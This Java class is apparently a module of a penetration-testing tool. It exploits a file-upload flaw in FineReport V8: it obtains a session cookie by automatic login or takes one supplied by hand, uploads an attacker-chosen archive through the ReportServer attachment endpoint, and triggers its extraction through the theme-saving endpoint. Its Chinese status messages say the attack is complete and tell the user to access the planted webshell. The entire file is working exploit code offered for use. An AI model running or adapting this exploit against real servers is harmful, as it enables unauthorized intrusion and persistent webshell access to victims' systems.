package com.droplab.Controller.FineReport.Service;

import com.alibaba.fastjson.JSON;
import com.droplab.Controller.FineReport.Common.V8UploadCommon;
import com.droplab.Utils.CommonUtils;
import com.droplab.Utils.HttpUtils;
import com.droplab.Utils.InfoUtils;
import com.droplab.Utils.ResponseUtils;
import com.droplab.service.BugService;
import org.jsoup.Connection;

import java.io.File;
import java.util.HashMap;
import java.util.Iterator;

public class V8FileUploadOne extends BugService {
    private final String contentPath = "/WebReport/ReportServer?op=fr_attach&cmd=ah_upload&filename=name.ziw&width=40&height=40";
    private final String unzipContentPath="/WebReport/ReportServer?op=fs_manager&cmd=save_theme&id=%s";

    @Override
    public Object run(String type) {
        try {
            if (params.size() > 0) {
                String url = "";
                String filepath = null;
                String cookie = "";
                Iterator<String> iterator = params.keySet().iterator();
                while (iterator.hasNext()) {
                    String key = iterator.next();
                    if (key.equals("url")) {
                        url = params.get(key);
                    } else if (key.equals("filepath")) {
                        filepath = params.get(key);
                    } else if (key.equals("cookie")) {
                        cookie = params.get(key);
                    }
                }
                if (!url.equals("")) {
                    ResponseUtils response = new ResponseUtils();
                    if (cookie.equals("")) {
                        cookie = new V8UploadCommon().getCookie(url);
                        if (cookie == null) { //自动登录失败
                            response.setMessage("帆软报表文件上传攻击自动登录失败,请尝试手动登录，输入cookie！");
                            return response;
                        }
                    }
                    HashMap fileMap = new HashMap(); //文件上传流
                    fileMap.put("FileData", new File(filepath));
                    HashMap<String, String> headers = new HashMap<>();
                    CommonUtils.hashMapClone(InfoUtils.headers, headers);
                    headers.put("Referer", url);
                    Connection.Response response1 = HttpUtils.post(url + contentPath, headers, null, fileMap);
                    String body = response1.body();
                    try {
                        HashMap resultMap = JSON.parseObject(body, HashMap.class);
                        String attach_id =(String) resultMap.get("attach_id");
                        if(attach_id != null && !attach_id.equals("")){  //解压上传文件
                            String sendUrl=url+String.format(unzipContentPath,attach_id);
                            headers.put("Cookie",cookie);
                            Connection.Response response2 = HttpUtils.post(headers,sendUrl,null);
                            response.setMessage("攻击完成请尝试访问webshell");
                            return response;
                        }
                    }catch (Exception e) {
                        e.printStackTrace();
                    }
                    response.setMessage("帆软报表文件上传攻击上传压缩包失败！！");
                    return response;
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }
}
